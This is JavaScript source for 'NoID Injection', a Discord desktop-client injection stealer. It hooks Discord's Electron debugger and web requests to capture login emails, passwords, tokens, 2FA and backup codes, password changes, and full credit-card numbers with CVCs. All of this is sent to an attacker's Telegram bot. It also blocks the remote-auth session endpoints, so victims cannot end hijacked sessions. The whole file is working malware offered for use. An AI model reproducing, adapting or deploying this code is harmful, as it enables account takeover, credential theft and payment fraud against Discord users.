// 🚨 NoID Injection - Ultimate Discord Data Extractor 🚨
// 🎯 Target: Discord Desktop App & Web Client
// 🛠️ Developer: https://github.com/OriganOH
// 🔗 Version: 1.0.0 (NoID Injection - Version)
// 
// ⚠️ WARNING: NoID Injection is the most advanced Discord data extraction tool:
// - 🔑 Real-time token monitoring & extraction
// - 👤 Instant profile change detection
// - 💬 Live message tracking (DMs, servers, deleted messages)
// - 🖼️ Media file capture (cached images, videos)
// - 🔐 Payment info & billing data extraction
// - 📁 Local storage monitoring
// - 📝 Log file analysis
// - 🛡️ Advanced Discord security bypass
// - 🔄 Automatic data refresh on changes

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

// NoID Configuration
const NoID_CONFIG = {
    BOT_TOKEN: 'NoID-Token',
    CHAT_ID: 'NoID-ChatID',
    API: "https://discord.com/api/v9/users/@me",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    }
};

// Execute JavaScript in Discord window
const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

// Get Discord token
const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

// Send Telegram message
const sendNoIDTelegramMessage = async (message) => {
    const url = `https://api.telegram.org/bot${NoID_CONFIG.BOT_TOKEN}/sendMessage`;
    const data = JSON.stringify({
        chat_id: NoID_CONFIG.CHAT_ID,
        text: `[NoID Injection] ${message}`,
        parse_mode: 'Markdown'
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${NoID_CONFIG.BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => responseData += chunk);
            res.on('end', () => resolve(responseData));
        });

        req.write(data);
        req.end();
    });
};

// Fetch Discord API data
const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", NoID_CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", { "Authorization": token });
const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });

// Handle login/register events
const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);
    await sendNoIDTelegramMessage(`🔐 *New Login Detected:* \nEmail: \`${email}\` \nPassword: \`${password}\` \nAction: ${action}`);
};

// Handle 2FA backup codes
const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);
    const filteredCodes = codes.filter(code => !code.consumed);
    let message = filteredCodes.map(code => `${code.code.substr(0, 4)}-${code.code.substr(4)}`).join('\n');
    await sendNoIDTelegramMessage(`🔐 *2FA Backup Codes Viewed:* \n\`\`\`${message}\`\`\``);
};

// Handle password changes
const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);
    await sendNoIDTelegramMessage(`🔐 *Password Changed:* \nOld: \`${oldPassword}\` \nNew: \`${newPassword}\``);
};

// Handle payment methods
const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);
    await sendNoIDTelegramMessage(`💳 *Credit Card Added:* \nNumber: \`${number}\` \nCVC: \`${cvc}\` \nExp: ${month}/${year}`);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);
    await sendNoIDTelegramMessage(`💳 *PayPal Account Added*`);
};

// Main window creation and event handling
const createWindow = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (method !== 'Network.responseReceived') return;
        if (!NoID_CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const response = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(response.body);

        const request = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(request.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) return; // 2FA case
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(requestData.code, "", responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
};

// Payment event handling
session.defaultSession.webRequest.onCompleted(NoID_CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;

    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

// Block remote auth sessions
session.defaultSession.webRequest.onBeforeRequest(NoID_CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) {
        return callback({ cancel: true });
    }
});

// Initialize NoID
createWindow();
module.exports = require('./core.asar'); // CORE ASAR DO NOT REMOVE ! - Origan.
